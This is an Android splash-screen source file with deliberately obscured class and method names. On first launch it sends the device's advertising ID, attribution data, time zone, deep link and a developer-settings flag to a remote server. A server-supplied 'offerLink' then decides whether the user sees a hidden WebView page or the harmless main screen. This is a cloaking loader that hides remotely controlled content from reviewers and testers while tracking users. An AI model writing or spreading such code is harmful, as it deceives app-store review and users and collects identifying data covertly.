package frog.company.app13june.cc;

import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import com.appsflyer.AppsFlyerConversionListener;
import com.appsflyer.AppsFlyerLib;
import com.facebook.FacebookSdk;
import com.facebook.applinks.AppLinkData;
import com.google.android.gms.ads.identifier.AdvertisingIdClient;
import com.google.android.gms.common.GooglePlayServicesNotAvailableException;
import com.google.android.gms.common.GooglePlayServicesRepairableException;
import com.google.gson.Gson;
import com.onesignal.OneSignal;

import java.io.IOException;
import java.util.Map;
import java.util.TimeZone;

import frog.company.app13june.Config;
import frog.company.app13june.MainActivity;
import frog.company.app13june.R;
import okhttp3.HttpUrl;
import okhttp3.OkHttpClient;
import okhttp3.Request;
import okhttp3.Response;

public class fef extends AppCompatActivity implements AppsFlyerConversionListener {

    String appLink;
    boolean first = true;
    Context ctxx;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_splash);

        ctxx = this;
        String old = getSharedPreferences(Config.sharedName, MODE_PRIVATE).getString(Config.sharedStr, null);
        if(old == null){
            Log.e("here", "h");
            initFb(this);
            initAps();
        } else {
            Log.e("here", "h2");
            earg(this, old);
        }

    }

    void initFb(fef activity){
        FacebookSdk.setApplicationId(Config.fcid);
        FacebookSdk.setAdvertiserIDCollectionEnabled(true);
        FacebookSdk.sdkInitialize(this);
        FacebookSdk.fullyInitialize();
        AppLinkData.fetchDeferredAppLinkData(this, new AppLinkData.CompletionHandler() {
            @Override
            public void onDeferredAppLinkDataFetched(@Nullable AppLinkData appLinkData) {
                if(appLinkData == null){
                    AppLinkData fromActivity = AppLinkData.createFromActivity(activity);
                    if(fromActivity != null) appLink = AppLinkData.createFromActivity(activity).getTargetUri().toString();
                    else appLink = null;
                } else {
                    appLink = appLinkData.getTargetUri().toString();
                }
            }
        });
    }

    void initAps(){
        OneSignal.initWithContext(this);
        OneSignal.setAppId(Config.one);
        AppsFlyerLib.getInstance().init(Config.apid, this, this);
        AppsFlyerLib.getInstance().start(this);
    }

    @Override
    public void onConversionDataSuccess(Map<String, Object> map) {
        if(!first) return;
        else log(map, 1);
    }

    @Override
    public void onConversionDataFail(String s) {
        if(!first) return;
        else log(null, -1);
    }

    @Override
    public void onAppOpenAttribution(Map<String, String> map) {
        if(!first) return;
        Log.e("onAttribOpen", "fail");
    }

    @Override
    public void onAttributionFailure(String s) {
        if(!first) return;
        Log.e("onAttribFail", "fail");
    }

    void log(Map<String, Object> map, int mode){
        new Thread(){
            @Override
            public void run() {
                first = false;

                Uri.Builder uri = Uri.parse(Config.url).buildUpon();
                if(mode == 1){
                    uri.appendQueryParameter(Config.campaign,String.valueOf(map.get("campaign")));
                    uri.appendQueryParameter(Config.media_source,String.valueOf(map.get("media_source")));
                    uri.appendQueryParameter(Config.af_channel,String.valueOf(map.get("af_channel")));
                } else {
                    uri.appendQueryParameter(Config.campaign, "null");
                    uri.appendQueryParameter(Config.media_source, "null");
                    uri.appendQueryParameter(Config.af_channel, "null");
                }
                try {
                    String bb = AdvertisingIdClient.getAdvertisingIdInfo(getApplicationContext()).getId();
                    uri.appendQueryParameter(Config.adid, bb);
                    if(bb != null)
                        OneSignal.setExternalUserId(bb);
                } catch (IOException | GooglePlayServicesNotAvailableException | GooglePlayServicesRepairableException e) {
                    e.printStackTrace();
                } finally {
                    try {
                        next(uri);
                    } catch (IOException e) {
                        e.printStackTrace();
                        st(ctxx);
                    }
                }
            }
        }.start();
    }

    void next(Uri.Builder ur) throws IOException {
        String i = AppsFlyerLib.getInstance().getAppsFlyerUID(this);
        String t = TimeZone.getDefault().getID();
        ur.appendQueryParameter(Config.tmz, t);
        ur.appendQueryParameter(Config.af_userid, i);
        ur.appendQueryParameter(Config.adb, getAD());
        ur.appendQueryParameter(Config.fb_deeplink, appLink);
        Uri uu = ur.build();
        OkHttpClient ok = new OkHttpClient();
        HttpUrl builder = HttpUrl.parse(uu.toString()).newBuilder().build();
        Log.e("Req", uu.toString());
        Request req = new Request.Builder().url(builder).build();
        Response resp = ok.newCall(req).execute();


        String stRerr = resp.body().string();


        Object stRe = new Gson().fromJson(stRerr,Map.class).get(Config.offerLink);
       // String stRe = stRer.replace("\"", "");
        //Log.e("StRe", stRe);
        if(stRe != null && !stRe.toString().equals("null")){
            earg(this, stRe.toString());
        }
        else {
            st(this);
        }
    }

    String getAD(){
        int adbStatus = Settings.Secure.getInt(this.getContentResolver(), "development_settings_enabled", 0);
        String adbTxt;
        if(adbStatus == 0){
            adbTxt = "false";
        }
        else {
            adbTxt = "true";
        }
        return adbTxt;
    }

    void st(Context ctx){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Intent in = new Intent(ctx, MainActivity.class);
                startActivity(in);
                finish();
            }
        });

    }

    void earg(Context ctx, String u){
        runOnUiThread(new Runnable() {
            @Override
            public void run() {
                Intent in = new Intent(ctx, WwActivity.class);
                in.putExtra(Config.sharedStr, u);
                getSharedPreferences(Config.sharedName, MODE_PRIVATE).edit().putString(Config.sharedStr, u).apply();
                startActivity(in);
                finish();
            }
        });
    }
}


